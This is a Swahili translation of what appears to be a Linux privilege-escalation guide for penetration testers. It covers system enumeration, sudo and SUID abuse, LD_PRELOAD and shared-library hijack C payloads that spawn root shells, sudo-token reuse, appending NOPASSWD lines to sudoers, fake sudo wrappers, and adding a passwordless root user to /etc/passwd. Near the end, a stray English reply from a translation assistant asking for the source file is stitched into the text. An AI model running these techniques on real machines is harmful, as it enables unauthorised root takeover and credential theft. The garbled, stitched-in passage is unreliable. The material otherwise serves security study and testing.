**Jifunze jinsi ya kuorodhesha na exploit mawasiliano ya D-Bus hapa:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mtandao**

Daima ni ya kuvutia kuorodhesha mtandao na kubaini nafasi ya mashine.

### Uorodheshaji wa kawaida
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Porti zilizo wazi

Daima angalia huduma za mtandao zinazokimbia kwenye mashine ambazo hukuweza kuingiliana nazo kabla ya kupata ufikiaji wake:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Angalia ikiwa unaweza sniff traffic. Ikiwa unaweza, unaweza kuwa na uwezo wa kupata baadhi ya credentials.
```
timeout 1 tcpdump
```
## Watumiaji

### Uorodhesaji wa Kawaida

Angalia **nani** wewe ni, ni **uruhusa** zipi unazo, ni **watumiaji** gani wako kwenye mifumo, ni wale gani wanaweza **kuingia** na ni wale gani wana **uruhusa za root:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID Kubwa

Baadhi ya toleo za Linux ziliathiriwa na mdudu uliowaruhusu watumiaji wenye **UID > INT_MAX** kuinua ruhusa. Taarifa zaidi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Vikundi

Angalia kama wewe ni **mwanachama wa kundi fulani** ambacho kinaweza kukupa ruhusa za root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Ubao wa kunakili

Angalia kama kuna kitu chochote cha kuvutia kipo ndani ya ubao wa kunakili (ikiwa inawezekana)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Sera ya Nywila
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Nenosiri zinazojulikana

Ikiwa unajua **nenosiri lolote** la mazingira, **jaribu kuingia kama kila mtumiaji** ukitumia nenosiri hilo.

### Su Brute

Ikiwa hukujali kufanya kelele nyingi na `su` na `timeout` binaries zipo kwenye kompyuta, unaweza kujaribu brute-force mtumiaji kwa kutumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) yenye parameter `-a` pia hujaribu brute-force watumiaji.

## Matumizi mabaya ya PATH inayoweza kuandikwa

### $PATH

Ikiwa unagundua kwamba unaweza **kuandika ndani ya folda fulani ya $PATH** unaweza kufanikiwa kupandisha privileges kwa **kuunda backdoor ndani ya folda inayoweza kuandikwa** kwa jina la amri fulani itakayotekelezwa na mtumiaji mwingine (root ideally) na ambayo **haitachukuliwa kutoka kwa folda iliyoko kabla** ya folda yako inayoweza kuandikwa katika $PATH.

### SUDO and SUID

Unaweza kuruhusiwa kutekeleza amri fulani kwa kutumia sudo au zinaweza kuwa na suid bit. Angalia kwa kutumia:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Baadhi ya amri **zisizotarajiwa zinakuwezesha kusoma na/au kuandika faili au hata kutekeleza amri.** Kwa mfano:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Usanidi wa Sudo unaweza kumruhusu mtumiaji kutekeleza amri fulani kwa kutumia ruhusa za mtumiaji mwingine bila kujua nywila.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Katika mfano huu mtumiaji `demo` anaweza kuendesha `vim` kama `root`, sasa ni rahisi kupata shell kwa kuongeza ssh key kwenye saraka ya root au kwa kuita `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Agizo hili linamruhusu mtumiaji **set an environment variable** wakati wa kutekeleza kitu:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Mfano huu, **iliyotegemea HTB machine Admirer**, ulikuwa **nyeti kwa PYTHONPATH hijacking** ili kupakia maktaba yoyote ya python wakati script ikiendeshwa kama root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV imehifadhiwa kupitia sudo env_keep → shell ya root

Ikiwa sudoers inahifadhi `BASH_ENV` (mfano, `Defaults env_keep+="ENV BASH_ENV"`), unaweza kutumia tabia ya kuanzishwa isiyo ya kiingiliano ya Bash ili kuendesha msimbo wowote kama root unapoitisha amri iliyoruhusiwa.

- Kwa nini inafanya kazi: Kwa shells zisizo za kiingiliano, Bash inatafsiri `$BASH_ENV` na inasoma (sources) faili hiyo kabla ya kuendesha script lengwa. Sheria nyingi za sudo zinaoruhusu kuendesha script au wrapper ya shell. Ikiwa `BASH_ENV` imehifadhiwa na sudo, faili yako itasomwa kwa haki za root.

- Mahitaji:
- Sheria ya sudo unayoweza kuitekeleza (lengo lolote linaloitisha `/bin/bash` bila kuingiliana, au script yoyote ya bash).
- `BASH_ENV` imepo katika `env_keep` (angalia kwa `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Kuimarisha:
- Ondoa `BASH_ENV` (na `ENV`) kutoka `env_keep`, tumia `env_reset`.
- Epuka shell wrappers kwa amri zilizo-ruhusiwa na sudo; tumia binaries ndogo.
- Fikiria sudo I/O logging na alerting wakati env vars zilizohifadhiwa zinapotumiwa.

### Njia za kupita kizuizi za utekelezaji wa sudo

**Ruka** kusoma faili nyingine au tumia **symlinks**. Kwa mfano kwenye faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ikiwa **wildcard** inapotumiwa (\*), ni rahisi zaidi:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Hatua za kuzuia**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bila kutaja njia ya amri

Ikiwa **sudo permission** imetolewa kwa amri moja tu **bila kubainisha njia**: _hacker10 ALL= (root) less_ unaweza kuiexploit kwa kubadilisha PATH variable
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Mbinu hii pia inaweza kutumika ikiwa **suid** binary **inatekeleza amri nyingine bila kubainisha njia yake (daima angalia kwa** _**strings**_ **yaliyomo ya SUID binary isiyo ya kawaida)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary yenye njia ya amri

Ikiwa **suid** binary **inatekeleza amri nyingine kwa kubainisha njia**, basi unaweza kujaribu **export a function** iliyopewa jina la amri ambayo faili ya suid inaiita.

Kwa mfano, ikiwa **suid** binary inaita _**/usr/sbin/service apache2 start**_ unapaswa kujaribu kuunda function hiyo na **export it**:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Kisha, unapoitisha suid binary, kazi hii itaendeshwa

### LD_PRELOAD & **LD_LIBRARY_PATH**

Variable ya mazingira **LD_PRELOAD** inatumika kutaja moja au zaidi ya maktaba za pamoja (.so files) ambazo zitaingizwa na loader kabla ya nyingine zote, ikiwa ni pamoja na maktaba ya kawaida ya C (`libc.so`). Mchakato huu unajulikana kama preloading a library.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia kipengele hiki kutumika vibaya, hasa kwa **suid/sgid** executables, mfumo unaweka masharti fulani:

- Loader haitii **LD_PRELOAD** kwa executables ambapo real user ID (_ruid_) haifanana na effective user ID (_euid_).
- Kwa executables zenye suid/sgid, maktaba tu katika njia za kawaida ambazo pia ni suid/sgid ndizo zinazo preloaded.

Privilege escalation inaweza kutokea ikiwa una uwezo wa kutekeleza amri kwa `sudo` na pato la `sudo -l` linajumuisha kauli **env_keep+=LD_PRELOAD**. Mpangilio huu unaruhusu variable ya mazingira **LD_PRELOAD** kuendelea kuwepo na kutambuliwa hata wakati amri zinaendeshwa kwa `sudo`, na hivyo kuweza kusababisha utekelezaji wa arbitrary code kwa ruhusa zilizoinuliwa.
```
Defaults        env_keep += LD_PRELOAD
```
Hifadhi kama **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kisha **kompaila** kwa kutumia:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Hatimaye, **escalate privileges** inapokimbizwa
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Privesc inayofanana inaweza kutumika vibaya ikiwa mshambuliaji anadhibiti env variable **LD_LIBRARY_PATH**, kwa sababu anadhibiti njia ambapo maktaba zitatafutwa.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Unapokutana na binary yenye **SUID** permissions ambayo inaonekana isiyo ya kawaida, ni desturi nzuri kuthibitisha ikiwa inapakia faili za **.so** ipasavyo. Hii inaweza kuangaliwa kwa kukimbiza amri ifuatayo:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Kwa mfano, kukutana na hitilafu kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunaonyesha uwezekano wa exploitation.

Ili exploit hili, mtu angeendelea kwa kuunda faili ya C, kwa mfano _"/path/to/.config/libcalc.c"_, iliyo na msimbo ufuatao:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Msimbo huu, mara utakapo compiled na executed, unalenga kuinua vibali kwa kubadilisha ruhusa za faili na kutekeleza shell yenye vibali vilivyoongezwa.

Compile faili ya C iliyotajwa hapo juu kuwa shared object (.so) kwa kutumia:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Mwishowe, kuendesha SUID binary iliyothiriwa kunapaswa kuchochea exploit, na hivyo kuwezesha kuvunjwa kwa usalama wa mfumo.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sasa kwa kuwa tumepata SUID binary inayopakia library kutoka kwa folder tunaoweza kuandika, tutengeneze library katika folder hiyo kwa jina linalohitajika:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ikiwa unapata kosa kama
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
hii inamaanisha kuwa maktaba uliyoiunda inapaswa kuwa na function iitwayo `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyochaguliwa ya Unix binaries ambazo zinaweza kutumika na mshambuliaji kupita vikwazo vya usalama vya ndani. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa lakini kwa matukio ambapo unaweza **kuingiza vigezo tu** katika amri.

Mradi unakusanya kazi halali za Unix binaries ambazo zinaweza kutumiwa vibaya kuondoka kwenye restricted shells, kuinua au kudumisha idhini zilizoinuliwa, kuhamisha faili, kuanzisha bind and reverse shells, na kurahisisha kazi nyingine za post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ikiwa unaweza kufikia `sudo -l` unaweza kutumia zana [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) kukagua kama inapata njia ya kutumia sheria yoyote ya sudo.

### Reusing Sudo Tokens

Katika matukio ambapo una **sudo access** lakini sio nywila, unaweza kuinua idhini kwa **kusubiri utekelezaji wa amri ya sudo kisha kunyakua token ya kikao**.

Mahitaji ya kuinua idhini:

- Tayari una shell kama mtumiaji "_sampleuser_"
- "_sampleuser_" ame**tumias `sudo`** kutekeleza kitu katika **dakika 15 zilizopita** (kwa chaguo-msingi hilo ndilo muda wa sudo token linaloturuhusu kutumia `sudo` bila kuingiza nywila)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (unaweza kuweza kuipakia)

(Unaweza kuanzisha kwa muda `ptrace_scope` na `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kwa kudumu kwa kubadilisha `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

Ikiwa mahitaji haya yote yamekidhiwa, **unaweza kuinua idhini kwa kutumia:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Exploit ya kwanza** (`exploit.sh`) itaumba binary `activate_sudo_token` katika _/tmp_. Unaweza kuitumia **kuamsha sudo token katika kikao chako** (huutapewa moja kwa moja shell ya root, fanya `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **exploit ya pili** (`exploit_v2.sh`) itaunda shell ya sh katika _/tmp_ **inamilikiwa na root na ikiwa na setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **exploit ya tatu** (`exploit_v3.sh`) **itaunda sudoers file** ambayo inafanya **sudo tokens kuwa za kudumu na inaruhusu watumiaji wote kutumia sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ikiwa una **idhinisho la kuandika** kwenye folda au kwenye faili yoyote iliyotengenezwa ndani ya folda unaweza kutumia bainari [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ku **unda token ya sudo kwa mtumiaji na PID**.\
Kwa mfano, ikiwa unaweza kuandika juu ya faili _/var/run/sudo/ts/sampleuser_ na una shell kama mtumiaji huyo mwenye PID 1234, unaweza **kupata ruhusa za sudo** bila kuhitaji kujua nenosiri kwa kufanya:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na faili zilizo ndani ya `/etc/sudoers.d` zinaweka ni nani anaweza kutumia `sudo` na jinsi inavyofanya kazi. Faili hizi **kwa chaguo-msingi zinaweza kusomwa tu na user root na group root**.\
**Kama** unaweza **kusoma** faili hii unaweza kuwa na uwezo wa **kupata baadhi ya taarifa za kuvutia**, na ikiwa unaweza **kuandika** faili yoyote utaweza **escalate privileges**
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ikiwa unaweza kuandika, unaweza kuitumia vibaya ruhusa hii
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Njia nyingine ya kutumia vibaya ruhusa hizi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Kuna baadhi ya mbadala ya binary ya `sudo` kama `doas` kwa OpenBSD; kumbuka kuangalia usanidi wake katika `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ikiwa unajua kwamba **user kawaida huungana kwenye machine na hutumia `sudo`** ili escalate privileges na umepata shell ndani ya muktadha wa user, unaweza **kuunda executable mpya ya sudo** ambayo itatekeleza code yako kama root kisha itatekeleza amri ya user. Kisha, **badilisha $PATH** ya muktadha wa user (kwa mfano kwa kuongeza path mpya katika .bash_profile) ili wakati user atakapotekeleza sudo, executable yako ya sudo itatekelezwa.

Kumbuka kwamba ikiwa user anatumia shell tofauti (si bash) utahitaji kubadilisha faili nyingine ili kuongeza path mpya. Kwa mfano[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. You can find another example in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Maktaba Iliyoshirikiwa

### ld.so

Faili `/etc/ld.so.conf` inaonyesha **wapi faili za usanidi zilizopakiwa zinatoka**. Kwa kawaida, faili hii ina njia ifuatayo: `include /etc/ld.so.conf.d/*.conf`

Hii inamaanisha kwamba faili za usanidi zilizo katika `/etc/ld.so.conf.d/*.conf` zitasomwa. Faili hizi za usanidi zinaonyesha **folda nyingine** ambako **maktaba** zitatafutwa. Kwa mfano, yaliyomo katika `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii ina maana kwamba mfumo utatafuta maktaba ndani ya `/usr/local/lib`**.

Iwapo kwa sababu fulani **mtumiaji ana ruhusa ya kuandika** kwenye mojawapo ya njia zilizoonyeshwa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili yoyote ndani ya `/etc/ld.so.conf.d/` au folda yoyote iliyotajwa ndani ya faili za usanidi `/etc/ld.so.conf.d/*.conf` anaweza kuwa na uwezo wa kuinua ruhusa.\
Angalia **how to exploit this misconfiguration** kwenye ukurasa ufuatao:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kwa kunakili lib ndani ya `/var/tmp/flag15/`, itatumika na programu hapa kama ilivyoainishwa katika kigezo cha `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Kisha tengeneza maktaba ya uovu katika `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities provide a **subset of the available root privileges to a process**. This effectively breaks up root **privileges into smaller and distinctive units**. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation.\
Soma ukurasa ufuatao ili **kujifunza zaidi kuhusu capabilities na jinsi ya kuvitumia vibaya**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

Katika directory, the **bit for "execute"** ina maana kwamba mtumiaji anayehusika anaweza "**cd**" into the folder.\
The **"read"** bit ina maana mtumiaji anaweza **list** the **files**, na the **"write"** bit ina maana mtumiaji anaweza **delete** na **create** new **files**.

## ACLs

Access Control Lists (ACLs) zinawakilisha safu ya pili ya ruhusa za hiari, zenye uwezo wa **overriding the traditional ugo/rwx permissions**. Ruhusa hizi zinaongeza udhibiti juu ya upatikanaji wa file au directory kwa kuruhusu au kukataa haki kwa users maalum ambao si wamiliki au sehemu ya group. Kiwango hiki cha **granularity ensures more precise access management**. Maelezo zaidi yanaweza kupatikana [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Mpe** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pata** faili zenye ACL maalum kutoka kwenye mfumo:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Fungua shell sessions

Katika **old versions** unaweza **hijack** baadhi ya **shell** session ya mtumiaji mwingine (**root**).\
Katika **newest versions** utaweza **connect** tu kwenye screen sessions za **mtumiaji wako mwenyewe**. Hata hivyo, unaweza kupata **taarifa za kuvutia ndani ya session**.

### screen sessions hijacking

**Orodhesha screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Unganisha kwenye kikao**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Hii ilikuwa tatizo na **old tmux versions**. Sikuweza hijack kikao cha tmux (v2.1) kilichoundwa na root kama mtumiaji asiye na ruhusa.

**Orodhesha sesheni za tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Unganisha kwenye kikao**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** kwa mfano.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Vifunguo vyote vya SSL na SSH vilivyotengenezwa kwenye mifumo inayotegemea Debian (Ubuntu, Kubuntu, etc) kati ya September 2006 na May 13th, 2008 vinaweza kuathiriwa na hitilafu hii.\
Hitilafu hii hutokea wakati wa kuunda ssh key mpya katika OS hizo, kwani **mabadiliko 32,768 tu yalikuwa yanayowezekana**. Hii inamaanisha kwamba uwezekano wote unaweza kuhesabiwa na **ikiwa una ssh public key unaweza kutafuta private key inayolingana**. Unaweza kupata uwezekano uliokadiriwa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Vigezo vya konfigurasi vinavyovutia

- **PasswordAuthentication:** Inaonyesha kama uthibitishaji kwa password unaruhusiwa. Chaguo-msingi ni `no`.
- **PubkeyAuthentication:** Inaonyesha kama uthibitishaji wa public key unaruhusiwa. Chaguo-msingi ni `yes`.
- **PermitEmptyPasswords**: Wakati uthibitishaji kwa password unaporuhusiwa, inaonyesha kama server inaruhusu kuingia kwenye akaunti zenye password tupu. Chaguo-msingi ni `no`.

### PermitRootLogin

Inaelezea kama root anaweza kuingia kwa kutumia ssh, chaguo-msingi ni `no`. Thamani zinazowezekana:

- `yes`: root anaweza kuingia akitumia password na private key
- `without-password` or `prohibit-password`: root anaweza kuingia tu kwa private key
- `forced-commands-only`: Root anaweza kuingia tu akitumia private key na ikiwa options za command zimeainishwa
- `no` : hapana

### AuthorizedKeysFile

Inaelezea faili zinazobeba public keys zinazoweza kutumika kwa uthibitishaji wa mtumiaji. Inaweza kuwa na tokens kama `%h`, ambazo zitatengenezwa kwa saraka ya nyumbani. **Unaweza kutumia absolute paths** (zinazoanza na `/`) au **relative paths kutoka kwa home ya mtumiaji**. Kwa mfano:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding inakuwezesha **use your local SSH keys instead of leaving keys** (without passphrases!) kukaa kwenye server yako. Kwa hivyo, utaweza **jump** via ssh **to a host** na kutoka hapo **jump to another** host **using** the **key** iliyoko kwenye **initial host** yako.

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Kumbuka kwamba ikiwa `Host` ni `*`, kila wakati mtumiaji anapohamia kwa mashine tofauti, host hiyo itakuwa na uwezo wa kupata keys (ambayo ni tatizo la usalama).

Faili `/etc/ssh_config` inaweza **kuingilia kati** hizi **chaguzi** na kuruhusu au kukataa usanidi huu.\
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukataa** ssh-agent forwarding kwa kigezo `AllowAgentForwarding` (chaguo-msingi ni kuruhusu).

Ikiwa unagundua kuwa Forward Agent imewekwa katika mazingira, soma ukurasa ufuatao kwani **unaweza kuutumia vibaya ili kupandisha ruhusa**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Faili za Kuvutia

### Faili za profile

Faili `/etc/profile` na faili zilizo chini ya `/etc/profile.d/` ni **scripti zinazotekelezwa wakati mtumiaji anapoanzisha shell mpya**. Kwa hivyo, ikiwa unaweza **kuandika au kubadilisha yoyote yao unaweza kupandisha ruhusa**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ikiwa skripti ya profile isiyokuwa ya kawaida inapopatikana, unapaswa kuikagua kwa **maelezo nyeti**.

### Passwd/Shadow Files

Kutegemea OS, faili za `/etc/passwd` na `/etc/shadow` zinaweza kuwa zikitumia jina tofauti au kuwa na nakala ya akiba. Kwa hivyo inashauriwa **kutafuta zote** na **kuangalia ikiwa unaweza kuzisoma** ili kuona **ikiwa kuna hashes** ndani ya faili hizo:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Katika baadhi ya matukio unaweza kupata **password hashes** ndani ya faili ya `/etc/passwd` (au sawa).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Inayoweza kuandikwa /etc/passwd

Kwanza, tengeneza nenosiri kwa kutumia mojawapo ya amri zifuatazo.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the README.md content. Please paste the exact markdown from src/linux-hardening/privilege-escalation/README.md that you want translated.

Also confirm:
- Do you want me to append a new section that shows commands to add the user `hacker` and include a generated password, or insert it at a specific place?
- If you want a generated password now, specify length/character set (e.g., 16 chars, include symbols) or I can create a secure random one and include it.

Once you provide the file content and confirm the password details, I'll return the translated markdown (English → Swahili) with the requested user/password addition, preserving all tags, links, paths and code blocks unchanged.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` na `hacker:hacker`

Vinginevyo, unaweza kutumia mistari ifuatayo kuongeza mtumiaji wa bandia bila nenosiri.\
TAHADHARI: huenda ukadhoofisha usalama wa sasa wa mashine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
